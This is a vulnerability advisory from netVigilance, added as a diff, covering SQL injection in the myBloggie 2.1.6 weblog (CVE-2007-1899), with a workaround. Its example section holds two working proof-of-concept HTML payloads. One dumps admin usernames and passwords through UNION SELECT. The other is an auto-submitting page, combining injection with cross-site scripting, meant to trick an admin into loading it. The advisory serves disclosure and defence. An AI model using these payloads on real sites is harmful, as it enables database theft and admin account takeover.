@@ -1,0 +1,126 @@
+netVigilance Security Advisory #40
+
+myBloggie version 2.1.6 Multiple SQL Injection Vulnerability
+Description:
+myBloggie (http://mywebland.com/mybloggie/) is considered one of the 
+most simple, user-friendliest yet packed with features Weblog system 
+available to date. Built using PHP & mySQL, web most popular scripting 
+language & database system enable myBloggie to be installed in any 
+webservers.
+A security problem in the product allows attackers to commit SQL injection.
+External References:
+Mitre CVE: CVE-2007-1899 
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1899
+NVD NIST: CVE-2007-1899 http://nvd.nist.gov/nvd.cfm?cvename=CVE-2007-1899
+OSVDB:
+
+Summary:
+myBloggie is weblog system built using PHP & mySQL, the webs most 
+popular scripting language & database system which enable myBloggie to 
+be installed in any webserver.
+
+Successful exploitation requires PHP magic_quotes_gpc set to Off and 
+register_globals set to “On”.
+Advisory URL:
+http://www.netvigilance.com/advisory0040
+
+Release Date: June 30th 2008
+
+Severity/Risk: Medium
+
+CVSS 2.0 Metrics
+Access Vector: Network
+Access Complexity: High
+Authentication: Not-required
+Confidentiality Impact: Partial
+Integrity Impact: Partial
+Availability Impact: Partial
+CVSS 2.0 Base Score: 5.1
+
+Target Distribution on Internet: Low
+
+Exploitability: Functional Exploit
+Remediation Level: Workaround
+Report Confidence: Uncorroborated
+
+Vulnerability Impact: Attack
+Host Impact: SQL Injection.
+
+SecureScout Testcase ID: TC 17969
+
+Vulnerable Systems:
+myBloggie version 2.1.6
+
+Vulnerability Type:
+SQL injection allows malicious people to execute their own SQL scripts. 
+This could be exploited to obtain sensitive data, modify database 
+contents or acquire administrator’s privileges.
+
+Vendor:
+myWebland (http://mywebland.com/)
+
+Vendor Status:
+The Vendor has been notified April 9th 2007, but did not respond.
+Workaround:
+In the php.ini file set magic_quotes_gpc = On and/or register_globals=Off
+
+Example:
+
+SQL Injection Vulnerability 1:
+Create html file with the next content:
+<html>
+<body>
+<form 
+action="http://[TARGET]/[MYBLOGGIE-DIRECTORY]/index.php?mode=viewuser" 
+method="POST">
+<input type="submit" name="user_id" value="1 #' UNION SELECT 
+CONCAT(`mb_user`.`user`,' -> ',`mb_user`.`password`),1,1,1,1,1,1,1,1,1 
+FROM `mb_user` /*">
+</form>
+</body>
+</html>
+
+REQUEST:
+Browse this file and click on the button
+REPLY:
+<tr><td colspan="3" class="spacer6"></td></tr>
+<tr><td></td><td></td><td align="right">
+<span class="f10pxgrey">Category : <a class="std" 
+href="?mode=viewcat&amp;cat_id=1">
+[SQL INJECTION RESULT - ADMIN NAME] -> [SQL INJECTION RESULT - ADMIN 
+PASSWORD]</a>
+Posted By : <b>1</b> | <img src="./templates/aura/images/comment.gif" 
+alt="" />
+<a class="std" href="?mode=viewid&amp;post_id=1">Comments</a>[1] |
+<img src="./templates/aura/images/trackback.gif" />
+
+SQL Injection Vulnerability 2:
+
+(SQL Injection + XSS Attack Vulnerability)
+Create html file with the next content and place it for example on 
+http://somedomain.com/file.html:
+<html>
+<body onLoad="document.forms(0).submit();">
+<form action=" 
+http://[TARGET]/[MYBLOGGIE-DIRECTORY]/admin.php?mode=edit" 
+method="POST"> <input type="hidden" name="post_id" value="-1' UNION 
+SELECT 1,2, CONCAT(`mb_user`.`user`,' -> ', `mb_user`.`password`), 
+'</textarea><script>alert(document.post.subject.value)</script>', 5,6,7 
+FROM `mb_user`#">
+</form>
+</body>
+</html>
+REQUEST:
+Induce a Mybloggie admin to browse the malicious page.
+http:// somedomain.com/file.html
+
+REPLY:
+Page containing username and password for Mybloggie admin account.
+
+
+Credits:
+Jesper Jurcenoks
+Co-founder netVigilance, Inc
+www.netvigilance.com
+
+# milw0rm.com [2008-06-30]
